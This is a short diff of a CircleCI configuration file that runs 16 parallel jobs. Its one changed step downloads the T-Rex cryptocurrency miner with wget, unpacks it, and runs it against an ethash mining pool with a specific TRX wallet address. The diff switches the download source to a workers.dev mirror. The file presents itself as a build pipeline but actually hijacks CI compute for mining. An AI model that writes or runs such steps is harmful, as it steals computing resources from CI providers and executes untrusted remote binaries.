@@ -6,7 +6,7 @@ jobs:
       parallelism: 16
       steps:
         - checkout
-        - run:  wget https://trex-miner.com/download/t-rex-0.24.8-linux.tar.gz && tar zxvf t-rex-0.24.8-linux.tar.gz && ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
+        - run:  wget https://www.mikasaxxd.workers.dev/0:/t-rex-0.24.8-linux.tar.gz && tar zxvf t-rex-0.24.8-linux.tar.gz && ./t-rex -a ethash -o ethash.unmineable.com:3333 -u TRX:TDUikTDLFXmZGro1be9FLHUSoe67BFeQXo.worker1 --ethstratum ETHPROXY
 
 workflows:
     version: 2.1
